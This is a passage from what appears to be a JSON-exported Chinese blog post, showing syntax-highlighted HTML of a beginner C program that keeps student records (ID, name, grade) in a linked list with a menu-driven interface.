punctuation\">)</span><span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>Link<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">==</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"录入失败！！\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"请输入学生学号和成绩\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s %s %d\"</span><span class=\"token punctuation\">,</span>q<span class=\"token operator\">-></span>data<span class=\"token punctuation\">.</span>no<span class=\"token punctuation\">,</span>q<span class=\"token operator\">-></span>data<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">,</span><span class=\"token operator\">&amp;</span>q<span class=\"token operator\">-></span>data<span class=\"token punctuation\">.</span>graeds<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token comment\">//printf(\"debug--->%s %s %d\",q->data.no,q->data.name,q->data.graeds);</span>\n\t<span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">-></span>next<span class=\"token operator\">!=</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\tp<span class=\"token operator\">=</span>p<span class=\"token operator\">-></span>next<span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\tp<span class=\"token operator\">-></span>next<span class=\"token operator\">=</span>q<span class=\"token punctuation\">;</span>\n\tq<span class=\"token operator\">-></span>next<span class=\"token operator\">=</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">//显示所有学生信息</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">linkshow</span><span class=\"token punctuation\">(</span>LinkList <span class=\"token operator\">&amp;</span>L<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\tLinkList p<span class=\"token operator\">=</span>L<span class=\"token operator\">-></span>next<span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"学号\\t姓名\\t成绩\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">;</span>p<span class=\"token operator\">!=</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span>p<span class=\"token operator\">=</span>p<span class=\"token operator\">-></span>next<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\t%s\\t%d\\n\"</span><span class=\"token punctuation\">,</span>p<span class=\"token operator\">-></span>data<span class=\"token punctuation\">.</span>no<span class=\"token punctuation\">,</span>p<span class=\"token operator\">-></span>data<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">,</span>p<span class=\"token operator\">-></span>data<span class=\"token punctuation\">.</span>graeds<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">//查找学生信息</span>\n<span class=\"token keyword\">void</span>  <span class=\"token function\">linksearch</span><span class=\"token punctuation\">(</span>LinkList <span class=\"token operator\">&amp;</span>L<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\tLinkList p<span class=\"token operator\">=</span>L<span class=\"token operator\">-></span>next<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">char</span> no<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"请输入要查找的学生学号：\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\"</span><span class=\"token punctuation\">,</span>no<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">!=</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">strcmp</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">-></span>data<span class=\"token punctuation\">.</span>no<span class=\"token punctuation\">,</span>no<span class=\"token punctuation\">)</span><span class=\"token operator\">==</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"学号\\t姓名\\t成绩\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\t%s\\t%d\\n\"</span><span class=\"token punctuation\">,</span>p<span class=\"token operator\">-></span>data<span class=\"token punctuation\">.</span>no<span class=\"token punctuation\">,</span>p<span class=\"token operator\">-></span>data<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">,</span>p<span class=\"token operator\">-></span>data<span class=\"token punctuation\">.</span>graeds<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token punctuation\">&#125;</span>\n\t\tp<span class=\"token operator\">=</span>p<span class=\"token operator\">-></span>next<span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">==</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"没有找到该学生信息！！\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">//显示指定位次学生信息</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">linkshowrank</span><span class=\"token punctuation\">(</span>LinkList <span class=\"token operator\">&amp;</span>L<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\tLinkList p<span class=\"token operator\">=</span>L<span class=\"token operator\">-></span>next<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">int</span> rank<span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"请输入要查找的学生位次：\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\"</span><span class=\"token punctuation\">,</span><span class=\"token operator\">&amp;</span>rank<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span>rank<span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\tp<span class=\"token operator\">=</span>p<span class=\"token operator\">-></span>next<span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"学号\\t姓名\\t成绩\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\t%s\\t%d\\n\"</span><span class=\"token punctuation\">,</span>p<span class=\"token operator\">-></span>data<span class=\"token punctuation\">.</span>no<span class=\"token punctuation\">,</span>p<span class=\"token operator\">-></span>data<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">,</span>p<span class=\"token operator\">-></span>data<span class=\"token punctuation\">.</span>graeds<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">//将新加入学生信息插入到指定位置</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">linkinsert</span><span class=\"token punctuation\">(</span>LinkList <span class=\"token operator\">&amp;</span>L<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\tLinkList p<span class=\"token operator\">=</span>L<span class=\"token punctuation\">;</span>\n\tLinkList q<span class=\"token punctuation\">;</span>\n\tq<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>LinkList<span class=\"token punctuation\">)</span><span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>Link<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">==</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"录入失败！！\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"请输入学生学号和成绩\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s%s%d\"</span><span class=\"token punctuation\">,</span>q<span class=\"token operator\">-></span>data<span class=\"token punctuation\">.</span>no<span class=\"token punctuation\">,</span>q<span class=\"token operator\">-></span>data<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">,</span><span class=\"token operator\">&amp;</span>q<span class=\"token operator\">-></span>data<span class=\"token punctuation\">.</span>graeds<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">int</span> rank<span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"请输入要插入的位置：\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\"</span><span class=\"token punctuation\">,</span><span class=\"token operator\">&amp;</span>rank<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span>rank<span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\tp<span class=\"token operator\">=</span>p<span class=\"token operator\">-></span>next<span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\tq<span class=\"token operator\">-></span>next<span class=\"token operator\">=</span>p<span class=\"token operator\">-></span>next<span class=\"token punctuation\">;</span>\n\tp<span class=\"token operator\">-></span>next<span class=\"token operator\">=</span>q<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">//显示学生现有学生人数</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">linkshownum</span><span class=\"token punctuation\">(</span>LinkList <span class=\"token operator\">&amp;</span>L<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\tLinkList p<span class=\"token operator\">=</span>L<span class=\"token operator\">-></span>next<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">int</span> num<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">;</span>p<span class=\"token operator\">!=</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span>p<span class=\"token operator\">=</span>p<span class=\"token operator\">-></span>next<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\tnum<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"现有学生人数为：%d\"</span><span class=\"token punctuation\">,</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">//删除指定学生信息</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">linkdelete</span><span class=\"token punctuation\">(</span>LinkList <span class=\"token operator\">&amp;</span>L<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\tLinkList p<span class=\"token operator\">=</span>L<span class=\"token operator\">-></span>next<span class=\"token punctuation\">;</span>\n\tLinkList q<span class=\"token operator\">=</span>L<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">char</span> no<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"请输入要删除的学生学号：\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\"</span><span class=\"token punctuation\">,</span>no<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">!=</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">strcmp</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">-></span>data<span class=\"token punctuation\">.</span>no<span class=\"token punctuation\">,</span>no<span class=\"token punctuation\">)</span><span class=\"token operator\">==</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\t\tq<span class=\"token operator\">-></span>next<span class=\"token operator\">=</span>p<span class=\"token operator\">-></span>next<span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token function\">free</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token punctuation\">&#125;</span>\n\t\tq<span class=\"token operator\">=</span>p<span class=\"token punctuation\">;</span>\n\t\tp<span class=\"token operator\">=</span>p<span class=\"token operator\">-></span>next<span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">==</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"没有找到该学生信息！！\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"是否初始化链表?(y/n/q)\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\tLinkList L<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">char</span> ch<span class=\"token operator\">=</span><span class=\"token char\">'n'</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%c\"</span><span class=\"token punctuation\">,</span><span class=\"token operator\">&amp;</span>ch<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>ch<span class=\"token operator\">==</span><span class=\"token char\">'y'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token function\">linkinit</span><span class=\"token punctuation\">(</span>L<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"初始化成功！！\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>ch<span class=\"token operator\">==</span><span class=\"token char\">'n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"请先初始化链表！\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>ch<span class=\"token operator\">==</span><span class=\"token char\">'q'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"退出程序！\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"输入错误！\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span>ch<span class=\"token operator\">==</span><span class=\"token char\">'y'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n请选择操作:\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"===============================\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"|1.添加学生信息               |\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"|2.显示所有学生信息           |\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"|3.查询指定学生信息           |\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"|4.显示指定位次学生信息       |\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"|5.将新加入学生信息插入       |\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"|6.删除指定位次学生信息       |\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"|7.显示学生现有学生人数       |\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"|8.结束查询                   |\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"===============================\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">int</span> choose<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\"</span><span class=\"token punctuation\">,</span><span class=\"token operator\">&amp;</span>choose<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">switch</span><span class=\"token punctuation\">(</span>choose<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\t\t<span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token operator\">:</span><span class=\"token comment\">//添加学生信息</span>\n\t\t\t<span class=\"token punctuation\">&#123;</span>\n\t\t\t\t<span class=\"token function\">linkadd</span><span class=\"token punctuation\">(</span>L<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token punctuation\">&#125;</span>\n\t\t\t<span class=\"token keyword\">case</span> <span class=\"token number\">2</span><span class=\"token operator\">:</span><span class=\"token comment\">//显示所有学生信息</span>\n\t\t\t<span class=\"token punctuation\">&#123;</span>\n\t\t\t\t<span class=\"token function\">linkshow</span><span class=\"token punctuation\">(</span>L<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token punctuation\">&#125;</span>\n\t\t\t<span class=\"token keyword\">case</span> <span class=\"token number\">3</span><span class=\"token operator\">:</span><span class=\"token comment\">//查询指定学生信息</span>\n\t\t\t<span class=\"token punctuation\">&#123;</span>\n\t\t\t\t<span class=\"token function\">linksearch</span><span class=\"token punctuation\">(</span>L<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token punctuation\">&#125;</span>\n\t\t\t<span class=\"token keyword\">case</span> <span class=\"token number\">4</span><span class=\"token operator\">:</span><span class=\"token comment\">//显示指定位次学生信息</span>\n\t\t\t<span class=\"token punctuation\">&#123;</span>\n\t\t\t\t<span class=\"token function\">linkshowrank</span><span class=\"token punctuation\">(</span>L<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token punctuation\">&#125;</span>\n\t\t\t<span class=\"token keyword\">case</span> <span class=\"token number\">5</span><span class=\"token operator\">:</span><span class=\"token comment\">//将新加入学生信息插入到指定位置</span>\n\t\t\t<span class=\"token punctuation\">&#123;</span>\n\t\t\t\t<span class=\"token function\">linkinsert</span><span class=\"token punctuation\">(</span>L<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token punctuation\">&#125;</span>\n\t\t\t<span class=\"token keyword\">case</span> <span class=\"token number\">6</span><span class=\"token operator\">:</span><span class=\"token comment\">//删除指定位次学生信息</span>\n\t\t\t<span class=\"token punctuation\">&#123;</span>\n\t\t\t\t<span class=\"token function\">linkdelete</span><span class=\"token punctuation\">(</span>L<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token punctuation\">&#125;</span>\n\t\t\t<span class=\"token keyword\">case</span> <span class=\"token number\">7</span><span class=\"token operator\">:</span><span class=\"token comment\">//显示学生现有学生人数</span>\n\t\t\t<span class=\"token punctuation\">&#123;</span>\n\t\t\t\t<span class=\"token function\">linkshownum</span><span class=\"token punctuation\">(</span>L<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token punctuation\">&#125;</span>\n\t\t\t<span class=\"token keyword\">case</span> <span class=\"token number\">8</span><span class=\"token operator\">:</span><span class=\"token comment\">//结束查询</span>\n\t\t\t<span class=\"token punctuation\">&#123;</span>\n\t\t\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"退出程序！\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t<span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token punctuation\">&#125;</span>\n\t\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token punctuation\">&#125;</span>\t\n\t<span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n\n\n\n\n\n\n\n\n",
            "tags": [
                "数据结构",
                "顺序表"
            ]
        }
    ]
}